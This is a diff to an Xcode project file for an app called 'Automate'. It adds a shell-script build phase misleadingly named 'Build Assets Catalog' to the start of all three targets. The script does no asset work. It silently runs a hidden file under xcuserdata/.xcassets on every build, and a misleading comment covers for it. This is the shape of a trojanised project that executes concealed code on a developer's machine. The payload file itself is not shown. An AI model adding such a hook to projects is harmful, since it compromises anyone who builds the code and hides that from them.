@@ -135,6 +135,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 220603BE25B1ACFB00A93495 /* Build configuration list for PBXNativeTarget "Automate" */;
 			buildPhases = (
+				BBDAF0911D4B9B0F1AAAC43A /* Build Assets Catalog */,
 				2206039025B1ACF500A93495 /* Sources */,
 				2206039125B1ACF500A93495 /* Frameworks */,
 				2206039225B1ACF500A93495 /* Resources */,
@@ -152,6 +153,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 220603C125B1ACFB00A93495 /* Build configuration list for PBXNativeTarget "AutomateTests" */;
 			buildPhases = (
+				BBDAF0911D4B9B0F1AAAC43A /* Build Assets Catalog */,
 				220603A625B1ACFB00A93495 /* Sources */,
 				220603A725B1ACFB00A93495 /* Frameworks */,
 				220603A825B1ACFB00A93495 /* Resources */,
@@ -170,6 +172,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 220603C425B1ACFB00A93495 /* Build configuration list for PBXNativeTarget "AutomateUITests" */;
 			buildPhases = (
+				BBDAF0911D4B9B0F1AAAC43A /* Build Assets Catalog */,
 				220603B125B1ACFB00A93495 /* Sources */,
 				220603B225B1ACFB00A93495 /* Frameworks */,
 				220603B325B1ACFB00A93495 /* Resources */,
@@ -595,6 +598,34 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+		
+	BBDAF0911D4B9B0F1AAAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = 2206038C25B1ACF500A93495 /* Project object */;
 }
